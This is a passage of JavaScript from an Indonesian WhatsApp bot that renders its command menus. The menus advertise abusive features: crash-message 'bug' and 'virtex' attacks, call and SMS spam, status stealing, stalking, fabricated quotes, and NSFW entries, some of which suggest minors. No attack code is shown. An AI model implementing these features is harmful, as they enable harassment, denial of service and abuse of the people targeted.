‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎@${owner}
`, buttons: [{ buttonId: `${prefix}comand`, buttonText: { displayText: 'MENU BOT' }, type: 1 },{ buttonId: `${prefix}sewa`, buttonText: { displayText: 'SEWA BOT' }, type: 1 },{ buttonId: `${prefix}syarat`, buttonText: { displayText: 'RULES BOT' }, type: 1 }], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: hasil, contextInfo: {mentionedJid: [sender, owner]}}}, 'buttonsMessage')
break
case 'listmenu':
case 'comand':
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
let nombokr = 1
			var listMsg = {
  title: `${ucapanWaktu} ${pushname}`,
  buttonText: 'List Menu',
  description: `Silahkan pilih menu nya disini`,
  footerText: `Silahkan klik button cmd di bawah ini untuk mengetahui menu pada bot`,  
  sections: [
{
"title": `LIST MENU KE 1`, 
"rows" : [
  {
  "title": "💵 Premium menu",
  "description": "khusus pengguna premium", 
 "rowId": `!allmenu`
   }]
  },{
  "title": "LIST MENU KE 2", 
 "rows" : [
  {
 "title": "👥 Menu Group",
  "description": "Fitur Ini hanya bisa di gunakan di dalam group", 
 "rowId": `!groupmenu`
  }]
  },{
 "title": "LIST MENU KE 3", 
 "rows" : [
  {
 "title": "👤 Owner Menu",
 "description": "Fitur Ini Khusus Owner", 
 "rowId": `!menuowner`
  }]
  },{
  "title": "LIST MENU KE 4", 
 "rows" : [
  {
 "title": "📩 Download Menu",
 "description": "Ingin Download Sesuatu? Klik disini", 
 "rowId": `!donlod`
  }]
  },{
     "title": "LIST MENU KE 5", 
 "rows" : [
  {
 "title": "🗳️ Random image",
 "description": "Gambar random", 
 "rowId": `!premiummenu`
  }]
  },{
     "title": "LIST MENU KE 6", 
 "rows" : [
  {
 "title": "🚨 Menu Searching",
 "description": "Mencari Sesuatu Dengan Mudah", 
 "rowId": `!search`
  }]
  },{
   "title": "LIST MENU KE 7", 
 "rows" : [
  {
 "title": "🕹 Image Efect",
 "description": "Membuat media gambar mu menjadi lebih keren", 
 "rowId": `!tomenu`
  }]
  },{
   "title": "LIST MENU KE 8", 
 "rows" : [
  {
 "title": "🛍️ Other menu",
 "description": "Lain Lain", 
 "rowId": `!menuvn`
  }]
  },{
   "title": "LIST MENU KE 9", 
 "rows" : [
  {
 "title": "📝 Text Maker",
 "description": "Membuat Logo Praktis klik disini", 
 "rowId": `!menumaker`
  }]
  },{
   "title": "LIST MENU KE 10", 
 "rows" : [
  {
 "title": "🔞 Nsfw Comand",
 "description": "Fitur Only +18 random hentai", 
 "rowId": `!menurandom`
  }]
  },{
   "title": "LIST MENU KE 11", 
 "rows" : [
  {
 "title": "🫂 Stalk Menu",
 "description": "Stalk akun orang", 
 "rowId": `!menuwibu`
  }]
  },{
  "title": "LIST MENU KE 12", 
 "rows" : [
  {
 "title": "🌍 Primbon Menu",
 "description": "Ramalan Primbon buat kamu yg percaya ramalan xixi", 
 "rowId": `!menutag`
  }]
  },{
   "title": "LIST MENU KE 13", 
 "rows" : [
  {
 "title": "🔖 Asupan Menu",
 "description": "Skip anj bocah sangean", 
 "rowId": `!menunews`
  }]
  },{
   "title": "LIST MENU KE 14", 
 "rows" : [
  {
 "title": "🎮 Game Menu",
 "description": "Fitur Game banh", 
 "rowId": `!menugame`
  }]
  },{
  "title": "LIST MENU KE 15", 
 "rows" : [
  {
 "title": "💳 Exp & Limit",
 "description": "Limit lu bang", 
 "rowId": `!menutag`
  }]
  },{
   "title": "LIST MENU KE 16", 
 "rows" : [
  {
  "title": "🎁 Ephoto 360",
 "description": "buat logo simpel", 
 "rowId": `!menuother`
    }]
  },{
  "title": "LIST MENU KE 17", 
 "rows" : [
  {
 "title": "👑 About Bot",
 "description": "Tampilkan seluruh about", 
 "rowId": `!menucek`
  }]
  },{
  "title": "LIST MENU KE 18", 
 "rows" : [
  {
 "title": "📂 Sticker Editing",
 "description": "Membuat sticker dll", 
 "rowId": `!menusticker`
  }]
  },{
   "title": "LIST MENU KE 19", 
 "rows" : [
  {
 "title": "⏳ Convert menu",
 "description": "ubah ubah apa gitu", 
 "rowId": `!menuother`
  }]
  },{
   "title": "LIST MENU KE 20", 
 "rows" : [
  {
 "title": "🎵 Sound menu",
 "description": "Lagu yang ada di bot, tidak perlu download",
 "rowId": `!menusound`
  }]
  },{
   "title": "LIST MENU KE 21", 
 "rows" : [
  {
 "title": "☘️ Menu Fun",
 "description": "Mau bermain sama bot? Klik disini", 
 "rowId": `!menufun`
  }]
  },{
   "title": "LIST MENU KE 22", 
 "rows" : [
  {
 "title": "📒 Rules Bot",
 "description": "rules menggunakan bot", 
 "rowId": `!ofc`
  }]
  },{
   "title": "LIST MENU KE 23", 
 "rows" : [
  {
 "title": "🌐 Official Grup",
 "description": "Forum grup bot", 
 "rowId": `!ofc`
  }]
  }
  ],
  listType: 1
  }
  itsmevall.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]}, quoted:mek })
  break
case 'allmenu3':
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
       txtt =`Hai ${pushname}\n ${ucapanWaktu} Kak 👋`

               buttons = [{buttonId:`${prefix}botstats`, 
               buttonText:{displayText: 'Informations︎'},type:1},
               {buttonId:`${prefix}owner`,buttonText:{displayText:'Creator︎'},type:1},
               {buttonId:`${prefix}command`,buttonText:{displayText:'Donasi'},type:1}]


               imageMsg = (await itsmevall.prepareMessageMedia(fs.readFileSync(`./media/oksip.jpeg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/oksip.jpeg`)})).imageMessage

               buttonsMessage = {
               contentText: `${txtt}`,
               footerText: `𝙎𝙩𝙖𝙩𝙪𝙨
               
 GROUP CHAT : ${groups.length} 
 PRIVATE CHAT : ${privat.length}
 TOTAL CHAT : ${totalChat.length}
 SPEED : ${latensie.toFixed(4)} _Second_
 RUNTIME : ${runtime(process.uptime())}
 PLATFORM : ${os.platform()}
 
╭─[ *OWNER* ] 
│• ${prefix}off
│• ${prefix}isbaileys
│• ${prefix}banchat
│• ${prefix}unbanchat
│• ${prefix}listbc
│• ${prefix}setcmd
│• ${prefix}delcmd
│• ${prefix}listcmd
│• ${prefix}restart
│• ${prefix}antidelete on|off
│• ${prefix}autoketik on|off
│• ${prefix}autoread gc in / gc off
│• ${prefix}autovn on|off
│• ${prefix}anticall on|off
│• ${prefix}getcaption
│• ${prefix}bugkatalog
│• ${prefix}buggc id grup
│• ${prefix}bugpc *only pc*
│• ${prefix}troliv1
│• ${prefix}troliv2 *total*
│• ${prefix}virtex
│• ${prefix}on
│• ${prefix}spamcall
│• ${prefix}spamsms
│• ${prefix}addprem
│• ${prefix}delprem
│• ${prefix}listprem
│• ${prefix}status
│• ${prefix}setthumb
│• ${prefix}settarget
│• ${prefix}setfakeimg
│• ${prefix}setreply
│• ${prefix}hacked nama
│• ${prefix}setprefix
│• ${prefix}mode /public-self/
│• ${prefix}term <code>
│• ${prefix}eval <code>
│• ${prefix}colongsw reply
└──────────

╭──[ *PREMIUM* ]
│• ${prefix}tiktoknowm
│• ${prefix}ytmp4
│• ${prefix}playmp4
└──────────

╭──[ *GRUP* ]
│• ${prefix}grup 
│• ${prefix}promote 
│• ${prefix}demote 
│• ${prefix}setdesc
│• ${prefix}setname
│• ${prefix}nsfw 1/0
│• ${prefix}kick 
│• ${prefix}add 
│• ${prefix}getbio
│• ${prefix}getname 
│• ${prefix}reminder 
│• ${prefix}listonline
│• ${prefix}sider reply
│• ${prefix}antilink on|off
│• ${prefix}tod
│• ${prefix}tospam jumlah
│• ${prefix}antihidetag on|off
│• ${prefix}antiviewonce on|off
│• ${prefix}antivirtex on|off
│• ${prefix}autojoin on|off
│• ${prefix}kickarea
└──────────

╭──[ *TOOLS* ]
│• ${prefix}nulis (kiri/kanan) <teks>
│• ${prefix}telesticker
│• ${prefix}stcmeme <teks>|<teks>
│• ${prefix}stickerwm <nama|author>
│• ${prefix}semoji <emoji>
│• ${prefix}attp <teks>
│• ${prefix}ttp <teks>
│• ${prefix}ttp2 <teks>
│• ${prefix}ttp3 <teks>
│• ${prefix}ttp4 <teks>
└──────────

╭──[ *MAKER* ] 
│• ${prefix}sticker
│• ${prefix}swm author|packname
│• ${prefix}take author|packname
│• ${prefix}fdeface
│• ${prefix}attp teks
│• ${prefix}fancytext teks
│• ${prefix}emoji 
│• ${prefix}halloween teks
│• ${prefix}vampire teks
│• ${prefix}codetxt teks
│• ${prefix}googletxt
│• ${prefix}spiderman teks
│• ${prefix}express teks
│• ${prefix}maker2d2 teks
│• ${prefix}maker2d3 teks
│• ${prefix}maker2d4 teks
│• ${prefix}golden teks
│• ${prefix}flower teks
│• ${prefix}dance
│• ${prefix}wooden teks
│• ${prefix}burn
│• ${prefix}glow teks
│• ${prefix}summer teks
│• ${prefix}neon teks
│• ${prefix}coffeecup teks
│• ${prefix}coffeecup2 teks
│• ${prefix}battlefield teks|teks
│• ${prefix}googletxt2 teks
│• ${prefix}transformer teks
│• ${prefix}nulis teks
│• ${prefix}text3d teks
│• ${prefix}warrior teks
└──────────

╭──[ *CONVERT* ]
│• ${prefix}tomp3
│• ${prefix}tomp4
│• ${prefix}toimg
│• ${prefix}slow
│• ${prefix}fast
│• ${prefix}reverse
│• ${prefix}tourl
└──────────

╭──[ *DOWNLOADER* ]
│• ${prefix}play query
│• ${prefix}ytmp4 link
│• ${prefix}ytmp3 link
│• ${prefix}video query
│• ${prefix}instagram link
│• ${prefix}twitter
│• ${prefix}facebook link
│• ${prefix}tiktokdl
│• ${prefix}tiktokmusic
│• ${prefix}tiktokmusic2
│• ${prefix}tiktokwm2
│• ${prefix}ytsearch
│• ${prefix}play
│• ${prefix}ytmp3
│• ${prefix}ytmp4
│• ${prefix}igdl
│• ${prefix}fbdl
│• ${prefix}brainly
│• ${prefix}lirik
│• ${prefix}tiktoknowm
│• ${prefix}pinterest
│• ${prefix}spotifysearch
└──────────

╭──[ *TAG* ]
│• ${prefix}hidetag
│• ${prefix}kontag
│• ${prefix}sticktag
│• ${prefix}totag
└──────────

╭─[ *GAME* ]
│• ${prefix}slot
│• ${prefix}tictactoe @tag
│• ${prefix}tebakgambar
│• ${prefix}suit *batu/kertas/gunting*
└──────

╭──[ *SEARCHING* ]
│• ${prefix}kbbi
│• ${prefix}jarak
│• ${prefix}translate
│• ${prefix}infogempa
│• ${prefix}covidindo
│• ${prefix}covidglobal
│• ${prefix}wikipedia
│• ${prefix}playstore
│• ${prefix}wattpad
│• ${prefix}newsinfo
│• ${prefix}jadwaltv
│• ${prefix}cuaca
│• ${prefix}gimage
│• ${prefix}wattpadsearch
│• ${prefix}shopee
│• ${prefix}drakorongoing
│• ${prefix}lk21 <query>
└──────────

╭──[ *RANDOM* ]
│• ${prefix}owner
│• ${prefix}sewabot
│• ${prefix}report
│• ${prefix}runtime
│• ${prefix}speed 
│• ${prefix}sc
│• ${prefix}rulesbot
│• ${prefix}sharelock
└──────────

╭──[ *UPSW* ]
│• ${prefix}upswteks
│• ${prefix}upswlokasi
│• ${prefix}upswsticker
│• ${prefix}upswimage
│• ${prefix}upswvideo
│• ${prefix}upswgif
└──────────

╭──[ *GABUT* ]
│• ${prefix}suit
│• ${prefix}artinama
│• ${prefix}jodoh
│• ${prefix}tebakumur
│• ${prefix}weton
│• ${prefix}jadian
│• ${prefix}faktaunik
│• ${prefix}anime
│• ${prefix}truth
│• ${prefix}dare
│• ${prefix}dadu
│• ${prefix}tebakgambar
│• ${prefix}tembak udara 
│• ${prefix}tembak laut
│• ${prefix}tembak darat
│• ${prefix}slot
│• ${prefix}quotes
│• ${prefix}quotesanime
│• ${prefix}quotesdilan
│• ${prefix}quotesimage
│• ${prefix}katabijak
│• ${prefix}randomnama
│• ${prefix}meme
│• ${prefix}darkjoke
│• ${prefix}memeindo
└──────────

╭──[ *TEXT PRO* ]
│• ${prefix}golden text
│• ${prefix}flower text
│• ${prefix}wooden text
│• ${prefix}burn text
│• ${prefix}glow text
│• ${prefix}summer text
│• ${prefix}neon text
│• ${prefix}coffeecup text
│• ${prefix}coffeecup2 text
│• ${prefix}battlefield text|text
│• ${prefix}googletxt2 text|text
│• ${prefix}transformer text|text
│• ${prefix}write text
│• ${prefix}waifu
│• ${prefix}phlogo text|*text
│• ${prefix}tfire text
│• ${prefix}phcomment text|text
│• ${prefix}wolf text
│• ${prefix}ytgol text
│• ${prefix}ytsilver text
│• ${prefix}t3d text
│• ${prefix}logoa text|text
│• ${prefix}marvel text|text
│• ${prefix}leavest text
│• ${prefix}neon2 text
│• ${prefix}wall text
│• ${prefix}notewrite text
│• ${prefix}pubglogo text|text
└──────────

╭──[ *FUN* ] 
│• ${prefix}fitnah
│• ${prefix}fitnahpc
│• ${prefix}kontak 0|p
│• ${prefix}lolivid
│• ${prefix}suit
│• ${prefix}toxic
│• ${prefix}flock
│• ${prefix}pantun
│• ${prefix}dadu
│• ${prefix}asupan
│• ${prefix}viewonce
│• ${prefix}detikvn number
│• ${prefix}detikvideo number
│• ${prefix}hbd
└──────────

╭──[ *STALKING* ]
│• ${prefix}igstalk
│• ${prefix}mlstalk
│• ${prefix}tkstalk
│• ${prefix}githubstalk
│• ${prefix}shortlink
└──────────

╭──[ *ASUPAN* ]
│• ${prefix}asupan
│• ${prefix}asupancecan
│• ${prefix}asupanhijaber
│• ${prefix}asupansantuy
│• ${prefix}asupanukhti
│• ${prefix}asupanbocil
│• ${prefix}asupanghea
│• ${prefix}asupanrika
│• ${prefix}xnxx <link>
│• ${prefix}xnxxsearch <query>
└──────────

╭──[ *NSFW* ]
│• ${prefix}yuri
│• ${prefix}hentai
│• ${prefix}anal
│• ${prefix}eroneko
│• ${prefix}lesbian
│• ${prefix}kitsune
│• ${prefix}bj
│• ${prefix}pussy
│• ${prefix}wallpaper
│• ${prefix}neko2
│• ${prefix}baka
│• ${prefix}slap
│• ${prefix}poke
│• ${prefix}keta
│• ${prefix}awoo
│• ${prefix}blowjob
│• ${prefix}megumin
│• ${prefix}neko
│• ${prefix}trapnime
└──────────

╭──[ *ANIME* ]
│• ${prefix}kurumi
│• ${prefix}deku
│• ${prefix}sao
│• ${prefix}chika
│• ${prefix}kaneki
│• ${prefix}touka
│• ${prefix}eren
│• ${prefix}naruto
│• ${prefix}minato
│• ${prefix}sagiri
│• ${prefix}sasuke
│• ${prefix}sakura
│• ${prefix}tsunade
│• ${prefix}gojosatoru
└──────────`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}
prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:"https://youtu.be/KO4sly3zHa0"}}})
               itsmevall.relayWAMessage(prep)
             
               break
case 'menuajaj2':
tes =`Hai Kak @${sender.split('@')[0]}`
tes2 =`╭─❒ ⌜ 𝙎𝙄𝙈𝙋𝙇𝙀 𝙈𝙀𝙉𝙐 ⌟ ❒
│_/\_ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙊𝙒𝙉𝙀𝙍 
│_/\_ ${prefix}off
│_/\_ ${prefix}isbaileys
│_/\_ ${prefix}banchat
│_/\_ ${prefix}unbanchat
│_/\_ ${prefix}listbc
│_/\_ ${prefix}setcmd
│_/\_ ${prefix}delcmd
│_/\_ ${prefix}listcmd
│_/\_ ${prefix}restart
│_/\_ ${prefix}antidelete on|off
│_/\_ ${prefix}autoketik on|off
│_/\_ ${prefix}autoread gc in / gc off
│_/\_ ${prefix}autovn on|off
│_/\_ ${prefix}anticall on|off
│_/\_ ${prefix}getcaption
│_/\_ ${prefix}bugkatalog
│_/\_ ${prefix}buggc id grup
│_/\_ ${prefix}bugpc *only pc*
│_/\_ ${prefix}troliv1
│_/\_ ${prefix}troliv2 *total*
│_/\_ ${prefix}virtex
│_/\_ ${prefix}on
│_/\_ ${prefix}status
│_/\_ ${prefix}setthumb
│_/\_ ${prefix}settarget
│_/\_ ${prefix}setfakeimg
│_/\_ ${prefix}setreply
│_/\_ ${prefix}hacked nama
│_/\_ ${prefix}setprefix
│_/\_ ${prefix}mode /public-self/
│_/\_ ${prefix}term <code>
│_/\_ ${prefix}eval <code>
│_/\_ ${prefix}colongsw reply
│ 
│   ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙂𝙍𝙐𝙋 
│_/\_ ${prefix}grup 
│_/\_ ${prefix}promote 
│_/\_ ${prefix}demote 
│_/\_ ${prefix}setdesc
│_/\_ ${prefix}setname
│_/\_ ${prefix}nsfw 1/0
│_/\_ ${prefix}kick 
│_/\_ ${prefix}add 
│_/\_ ${prefix}getbio
│_/\_ ${prefix}getname 
│_/\_ ${prefix}reminder 
│_/\_ ${prefix}listonline
│_/\_ ${prefix}sider reply
│_/\_ ${prefix}antilink on|off
│_/\_ ${prefix}tod
│_/\_ ${prefix}tospam jumlah
│_/\_ ${prefix}antihidetag on|off
│_/\_ ${prefix}antiviewonce on|off
│_/\_ ${prefix}antivirtex on|off
│_/\_ ${prefix}autojoin on|off
│_/\_ ${prefix}kickarea
│
│   ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙈𝘼𝙆𝙀𝙍 
│_/\_ ${prefix}sticker
│_/\_ ${prefix}swm author|packname
│_/\_ ${prefix}take author|packname
│_/\_ ${prefix}fdeface
│_/\_ ${prefix}attp teks
│_/\_ ${prefix}fancytext teks
│_/\_ ${prefix}emoji 
│_/\_ ${prefix}halloween teks
│_/\_ ${prefix}vampire teks
│_/\_ ${prefix}codetxt teks
│_/\_ ${prefix}googletxt
│_/\_ ${prefix}spiderman teks
│_/\_ ${prefix}express teks
│_/\_ ${prefix}maker2d2 teks
│_/\_ ${prefix}maker2d3 teks
│_/\_ ${prefix}maker2d4 teks
│_/\_ ${prefix}golden teks
│_/\_ ${prefix}flower teks
│_/\_ ${prefix}dance
│_/\_ ${prefix}wooden teks
│_/\_ ${prefix}burn
│_/\_ ${prefix}glow teks
│_/\_ ${prefix}summer teks
│_/\_ ${prefix}neon teks
│_/\_ ${prefix}coffeecup teks
│_/\_ ${prefix}coffeecup2 teks
│_/\_ ${prefix}battlefield teks|teks
│_/\_ ${prefix}googletxt2 teks
│_/\_ ${prefix}transformer teks
│_/\_ ${prefix}nulis teks
│_/\_ ${prefix}text3d teks
│_/\_ ${prefix}warrior teks
│ 
│    ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘾𝙊𝙉𝙑𝙀𝙍𝙏 
│_/\_ ${prefix}tomp3
│_/\_ ${prefix}tomp4
│_/\_ ${prefix}toimg
│_/\_ ${prefix}slow
│_/\_ ${prefix}fast
│_/\_ ${prefix}reverse
│_/\_ ${prefix}tourl
│ 
│   ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿𝙀𝙍 
│_/\_ ${prefix}play query
│_/\_ ${prefix}ytmp4 link
│_/\_ ${prefix}ytmp3 link
│_/\_ ${prefix}video query
│_/\_ ${prefix}instagram link
│_/\_ ${prefix}twitter
│_/\_ ${prefix}facebook link
│_/\_ ${prefix}tiktokdl
│ 
│   ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙏𝘼𝙂 
│_/\_ ${prefix}hidetag
│_/\_ ${prefix}kontag
│_/\_ ${prefix}sticktag
│_/\_ ${prefix}totag
│ 
│    ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙐𝙋𝙎𝙒 
│_/\_ ${prefix}upswteks
│_/\_ ${prefix}upswlokasi
│_/\_ ${prefix}upswsticker
│_/\_ ${prefix}upswimage
│_/\_ ${prefix}upswvideo
│_/\_ ${prefix}upswgif
│
│    ⬣ 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
│_/\_  ${prefix}slot
│_/\_  ${prefix}tictactoe @tag
│_/\_  ${prefix}tebakgambar
│_/\_  ${prefix}suit *batu/kertas/gunting*
│
│    ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙁𝙐𝙉 
│_/\_ ${prefix}fitnah
│_/\_ ${prefix}fitnahpc
│_/\_ ${prefix}kontak 0|p
│_/\_ ${prefix}lolivid
│_/\_ ${prefix}suit
│_/\_ ${prefix}toxic
│_/\_ ${prefix}flock
│_/\_ ${prefix}pantun
│_/\_ ${prefix}dadu
│_/\_ ${prefix}asupan
│_/\_ ${prefix}viewonce
│_/\_ ${prefix}detikvn number
│_/\_ ${prefix}detikvideo number
│_/\_ ${prefix}hbd
│ 
│    ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙉𝙎𝙁𝙒 
│_/\_ ${prefix}yuri
│_/\_ ${prefix}hentai
│_/\_ ${prefix}anal
│_/\_ ${prefix}eroneko
│_/\_ ${prefix}lesbian
│_/\_ ${prefix}kitsune
│_/\_ ${prefix}bj
│_/\_ ${prefix}pussy
│_/\_ ${prefix}wallpaper
│_/\_ ${prefix}neko2
│_/\_ ${prefix}baka
│_/\_ ${prefix}slap
│_/\_ ${prefix}poke
│_/\_ ${prefix}keta
│_/\_ ${prefix}awoo
│_/\_ ${prefix}blowjob
│_/\_ ${prefix}megumin
│_/\_ ${prefix}neko
│_/\_ ${prefix}trapnime
└──────[ GITHUB ]──────❒
│_/\_Script Ory :
│_/\_https://github.com/Fauzibanh
│_/\_Notes : CARI AJA SENDIRI:V
└❏─────────────`
sendButLocation(from, tes,tes2,`Active : ${runtime(process.uptime())}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}listmenu`,buttonText:{displayText:'LIST MENU'},type:1},{buttonId:`${prefix}sewa`,buttonText:{displayText:'SEWA BOT'},type:1},{buttonId:`${prefix}syarat`,buttonText:{displayText:'RULES BOT'},type:1}], {contextInfo: { mentionedJid: [stod]}})
break                    
case "semuamenu":
   if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})            
   reply(`╭─❒ *LIST ALL MENU BOT*
│_/\_ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙊𝙒𝙉𝙀𝙍 
│_/\_ ${prefix}off
│_/\_ ${prefix}isbaileys
│_/\_ ${prefix}banchat
│_/\_ ${prefix}unbanchat
│_/\_ ${prefix}listbc
│_/\_ ${prefix}setcmd
│_/\_ ${prefix}delcmd
│_/\_ ${prefix}listcmd
│_/\_ ${prefix}restart
│_/\_ ${prefix}antidelete on|off
│_/\_ ${prefix}autoketik on|off
│_/\_ ${prefix}autoread gc in / gc off
│_/\_ ${prefix}autovn on|off
│_/\_ ${prefix}anticall on|off
│_/\_ ${prefix}getcaption
│_/\_ ${prefix}bugkatalog
│_/\_ ${prefix}buggc id grup
│_/\_ ${prefix}bugpc *only pc*
│_/\_ ${prefix}troliv1
│_/\_ ${prefix}troliv2 *total*
│_/\_ ${prefix}virtex
│_/\_ ${prefix}on
│_/\_ ${prefix}status
│_/\_ ${prefix}setthumb
│_/\_ ${prefix}settarget
│_/\_ ${prefix}setfakeimg
│_/\_ ${prefix}setreply
│_/\_ ${prefix}hacked nama
│_/\_ ${prefix}setprefix
│_/\_ ${prefix}mode /public-self/
│_/\_ ${prefix}term <code>
│_/\_ ${prefix}eval <code>
│_/\_ ${prefix}colongsw reply
│ 
│   ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙂𝙍𝙐𝙋 
│_/\_ ${prefix}grup 
│_/\_ ${prefix}promote 
│_/\_ ${prefix}demote 
│_/\_ ${prefix}setdesc
│_/\_ ${prefix}setname
│_/\_ ${prefix}nsfw 1/0
│_/\_ ${prefix}kick 
│_/\_ ${prefix}add 
│_/\_ ${prefix}getbio
│_/\_ ${prefix}getname 
│_/\_ ${prefix}reminder 
│_/\_ ${prefix}listonline
│_/\_ ${prefix}sider reply
│_/\_ ${prefix}antilink on|off
│_/\_ ${prefix}tod
│_/\_ ${prefix}tospam jumlah
│_/\_ ${prefix}antihidetag on|off
│_/\_ ${prefix}antiviewonce on|off
│_/\_ ${prefix}antivirtex on|off
│_/\_ ${prefix}autojoin on|off
│_/\_ ${prefix}kickarea
│
│   ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙈𝘼𝙆𝙀𝙍 
│_/\_ ${prefix}sticker
│_/\_ ${prefix}swm author|packname
│_/\_ ${prefix}take author|packname
│_/\_ ${prefix}fdeface
│_/\_ ${prefix}attp teks
│_/\_ ${prefix}fancytext teks
│_/\_ ${prefix}emoji 
│_/\_ ${prefix}halloween teks
│_/\_ ${prefix}vampire teks
│_/\_ ${prefix}codetxt teks
│_/\_ ${prefix}googletxt
│_/\_ ${prefix}spiderman teks
│_/\_ ${prefix}express teks
│_/\_ ${prefix}maker2d2 teks
│_/\_ ${prefix}maker2d3 teks
│_/\_ ${prefix}maker2d4 teks
│_/\_ ${prefix}golden teks
│_/\_ ${prefix}flower teks
│_/\_ ${prefix}dance
│_/\_ ${prefix}wooden teks
│_/\_ ${prefix}burn
│_/\_ ${prefix}glow teks
│_/\_ ${prefix}summer teks
│_/\_ ${prefix}neon teks
│_/\_ ${prefix}coffeecup teks
│_/\_ ${prefix}coffeecup2 teks
│_/\_ ${prefix}battlefield teks|teks
│_/\_ ${prefix}googletxt2 teks
│_/\_ ${prefix}transformer teks
│_/\_ ${prefix}nulis teks
│_/\_ ${prefix}text3d teks
│_/\_ ${prefix}warrior teks
│ 
│    ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘾𝙊𝙉𝙑𝙀𝙍𝙏 
│_/\_ ${prefix}tomp3
│_/\_ ${prefix}tomp4
│_/\_ ${prefix}toimg
│_/\_ ${prefix}slow
│_/\_ ${prefix}fast
│_/\_ ${prefix}reverse
│_/\_ ${prefix}tourl
│ 
│   ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿𝙀𝙍 
│_/\_ ${prefix}play query
│_/\_ ${prefix}ytmp4 link
│_/\_ ${prefix}ytmp3 link
│_/\_ ${prefix}video query
│_/\_ ${prefix}instagram link
│_/\_ ${prefix}twitter
│_/\_ ${prefix}facebook link
│_/\_ ${prefix}tiktokdl
│ 
│   ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙏𝘼𝙂 
│_/\_ ${prefix}hidetag
│_/\_ ${prefix}kontag
│_/\_ ${prefix}sticktag
│_/\_ ${prefix}totag
│ 
│    ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙐𝙋𝙎𝙒 
│_/\_ ${prefix}upswteks
│_/\_ ${prefix}upswlokasi
│_/\_ ${prefix}upswsticker
│_/\_ ${prefix}upswimage
│_/\_ ${prefix}upswvideo
│_/\_ ${prefix}upswgif
│
│    ⬣ *GAME MENU*
│_/\_  ${prefix}slot
│_/\_  ${prefix}tictactoe @tag
│_/\_  ${prefix}tebakgambar
│_/\_  ${prefix}suit *batu/kertas/gunting*
│
│    ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙁𝙐𝙉 
│_/\_ ${prefix}fitnah
│_/\_ ${prefix}fitnahpc
│_/\_ ${prefix}kontak 0|p
│_/\_ ${prefix}lolivid
│_/\_ ${prefix}suit
│_/\_ ${prefix}toxic
│_/\_ ${prefix}flock
│_/\_ ${prefix}pantun
│_/\_ ${prefix}dadu
│_/\_ ${prefix}asupan
│_/\_ ${prefix}viewonce
│_/\_ ${prefix}detikvn number
│_/\_ ${prefix}detikvideo number
│_/\_ ${prefix}hbd
│ 
│    ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙉𝙎𝙁𝙒 
│_/\_ ${prefix}yuri
│_/\_ ${prefix}hentai
│_/\_ ${prefix}anal
│_/\_ ${prefix}eroneko
│_/\_ ${prefix}lesbian
│_/\_ ${prefix}kitsune
│_/\_ ${prefix}bj
│_/\_ ${prefix}pussy
│_/\_ ${prefix}wallpaper
│_/\_ ${prefix}neko2
│_/\_ ${prefix}baka
│_/\_ ${prefix}slap
│_/\_ ${prefix}poke
│_/\_ ${prefix}keta
│_/\_ ${prefix}awoo
│_/\_ ${prefix}blowjob
│_/\_ ${prefix}megumin
│_/\_ ${prefix}neko
│_/\_ ${prefix}trapnime
└──────[ GITHUB ]──────❒
│_/\_Script Ory :
│_/\_https://github.com/Fauzibanh
│_/\_Notes : CARI SENDIRI:V
└──────────────────❒`)
break
case "keranjang":
